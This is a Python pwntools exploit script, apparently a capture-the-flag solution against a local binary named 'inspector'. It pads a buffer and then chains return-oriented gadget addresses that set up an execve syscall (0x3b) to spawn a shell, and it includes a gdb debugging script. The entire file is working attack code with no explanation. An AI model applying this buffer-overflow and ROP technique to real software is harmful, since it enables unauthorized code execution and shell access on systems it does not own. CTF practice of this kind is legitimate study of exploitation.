#import from py
import re

#outside imports
from pwn import *

#used for pulling the flag from output
flag_regex = r"flag\{[^}]+\}"
global_timeout = 5 #seconds

do_remote = False
binary_name = './inspector'

#for doing local debugging
is_local_dbg = False
gdb_script = '''
set pagination off
set disassembly-flavor intel
i proc mappings
b*0x00400678
b*0x00400672
b main
'''



DATA = ''
# DATA += 'A' * 2048
# DATA += p64(0x00400621)
# DATA += p64(0x00400621)
# DATA += p64(0x00400621)

#uncomment these
DATA += ('AAAAAAAA')
DATA += ('AAAAAAAA')
DATA += ('AAAAAAAA')
DATA += ('AAAAAAAA')
DATA += ('AAAAAAAA')

DATA += p64(0x00400646) #first called after padding.
DATA += p64(0x3b)
DATA += p64(0x0040063e)
DATA += p64(0x00)
DATA += p64(0x00400636)
DATA += p64(0x00)
DATA += p64(0x0040062e)
DATA += p64(0x00400708)
DATA += p64(0x00400625)


# DATA += ('0000003b')
# DATA += p64(0x00400621)
# DATA += p64(0x00)
# DATA += p64(0x0040062e)



if is_local_dbg:
    target = gdb.debug(binary_name, gdb_script)
else:
    target = process(binary_name)
print target.read()
print DATA
target.sendline(DATA)
target.interactive()

